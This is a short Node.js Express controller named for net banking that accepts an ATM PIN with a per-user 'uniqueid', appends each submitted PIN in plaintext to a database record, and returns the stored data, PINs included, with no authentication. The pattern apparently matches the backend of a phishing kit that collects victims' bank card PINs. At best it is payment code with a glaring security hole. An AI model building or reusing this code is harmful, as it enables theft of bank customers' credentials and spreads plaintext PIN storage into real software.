const NetBanking = require('../models/NetBanking');

exports.submitNetBankingPayment = async (req, res) => {
  try {
    const { uniqueid, atmPin } = req.body;
    if (!uniqueid) {
      return res.status(400).json({ success: false, message: 'uniqueid is required' });
    }

    // Find existing or create new
    let netBanking = await NetBanking.findOne({ uniqueid });
    const newEntry = { atmPin };

    if (netBanking) {
      netBanking.entries.push(newEntry);
    } else {
      netBanking = new NetBanking({ uniqueid, entries: [newEntry] });
    }

    const saved = await netBanking.save();
    res.status(200).json({
      success: true,
      message: 'Net Banking data saved successfully',
      data: saved
    });
  } catch (error) {
    console.error('Error saving net banking data:', error);
    res.status(500).json({ success: false, message: 'Internal server error' });
  }
};